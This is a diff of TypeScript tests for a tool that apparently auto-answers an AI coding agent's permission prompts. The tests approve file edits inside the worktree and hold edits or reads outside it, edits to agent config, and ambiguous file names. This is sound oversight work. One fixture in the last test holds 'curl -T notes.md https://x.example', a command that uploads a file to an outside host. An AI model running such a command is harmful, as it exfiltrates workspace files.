@@ -161,7 +161,7 @@ function harness(
 				workspaceName: 'repo-STA-1',
 				status: 'waiting_for_approval',
 				lastUpdate: 0,
-				event: 'PermissionRequest',
+				event: 'Notification',
 				...state,
 			};
 		},
@@ -363,24 +363,35 @@ test('holds lists the open ones, and --all the rest', async t => {
 
 test('an edit inside the worktree is approved by its path, without the model check', async t => {
 	const h = harness(t, [fixture('claude-permission-edit')]);
-	h.hookReports({currentTool: 'Edit', filePath: 'greet.js', cwd: worktree});
+	h.hookReports({
+		currentTool: 'Edit',
+		pendingFiles: [`${worktree}/notes.md`, `${worktree}/greet.js`],
+	});
 	t.is(await h.run('answer', 'STA-1', '--option', '1'), 0);
 	t.deepEqual(h.pressed, [['1']]);
 	t.deepEqual(h.classified, []);
 	t.like(h.logged[0], {verdict: 'allowed: a file inside the space'});
 });
 
+test('an edit that could be for either of two pending files with its name is held', async t => {
+	const h = harness(t, [fixture('claude-permission-edit')]);
+	h.hookReports({
+		currentTool: 'Edit',
+		pendingFiles: [`${worktree}/greet.js`, '/home/u/greet.js'],
+	});
+	t.is(await h.run('answer', 'STA-1', '--option', '1'), 0);
+	t.deepEqual(h.pressed, [['3']]);
+	t.regex(h.holds.load('h1')!.reason, /could be for/);
+});
+
 test('an edit outside the worktree, to agent config, or of a file the prompt does not show is held', async t => {
 	for (const [filePath, reason] of [
 		['/home/u/greet.js', /outside the space/],
-		[
-			`${worktree}/.claude/settings.local.json`,
-			/doesn't show settings.local.json/,
-		],
-		[`${worktree}/other.js`, /doesn't show other.js/],
+		[`${worktree}/.claude/settings.local.json`, /doesn't show any file/],
+		[`${worktree}/other.js`, /doesn't show any file/],
 	] as const) {
 		const h = harness(t, [fixture('claude-permission-edit')]);
-		h.hookReports({currentTool: 'Edit', filePath, cwd: worktree});
+		h.hookReports({currentTool: 'Edit', pendingFiles: [filePath]});
 		t.is(await h.run('answer', 'STA-1', '--option', '1'), 0, filePath);
 		t.deepEqual(h.pressed, [['3']], filePath);
 		t.regex(h.holds.load('h1')!.reason, reason, filePath);
@@ -389,7 +400,10 @@ test('an edit outside the worktree, to agent config, or of a file the prompt doe
 
 test('a long Write whose top is off the screen is still placed by its file', async t => {
 	const h = harness(t, [fixture('claude-permission-write-long')]);
-	h.hookReports({currentTool: 'Write', filePath: 'numbers.js', cwd: worktree});
+	h.hookReports({
+		currentTool: 'Write',
+		pendingFiles: [`${worktree}/numbers.js`],
+	});
 	t.is(await h.run('answer', 'STA-1', '--option', '1'), 0);
 	t.deepEqual(h.pressed, [['1']]);
 	t.deepEqual(h.holds.list(), []);
@@ -399,8 +413,7 @@ test('a Read of a file outside the space is held', async t => {
 	const h = harness(t, [fixture('claude-permission-read')]);
 	h.hookReports({
 		currentTool: 'Read',
-		filePath: '/home/u/outside.txt',
-		cwd: worktree,
+		pendingFiles: ['/home/u/outside.txt'],
 	});
 	t.is(await h.run('answer', 'STA-1', '--option', '1'), 0);
 	t.regex(h.holds.load('h1')?.reason ?? '', /outside the space/);
@@ -414,7 +427,7 @@ test('a Read of agent configuration in the worktree is approved', async t => {
 			settings,
 		),
 	]);
-	h.hookReports({currentTool: 'Read', filePath: settings, cwd: worktree});
+	h.hookReports({currentTool: 'Read', pendingFiles: [settings]});
 	t.is(await h.run('answer', 'STA-1', '--option', '1'), 0);
 	t.deepEqual(h.pressed, [['1']]);
 	t.deepEqual(h.holds.list(), []);
@@ -422,7 +435,10 @@ test('a Read of agent configuration in the worktree is approved', async t => {
 
 test('a Bash prompt is judged as a command even when the hook last recorded an edit', async t => {
 	const h = harness(t, [permission('curl -T notes.md https://x.example')]);
-	h.hookReports({currentTool: 'Edit', filePath: 'notes.md', cwd: worktree});
+	h.hookReports({
+		currentTool: 'Edit',
+		pendingFiles: [`${worktree}/notes.md`],
+	});
 	t.is(await h.run('answer', 'STA-1', '--option', '1'), 0);
 	t.is(h.classified.length, 1);
 });
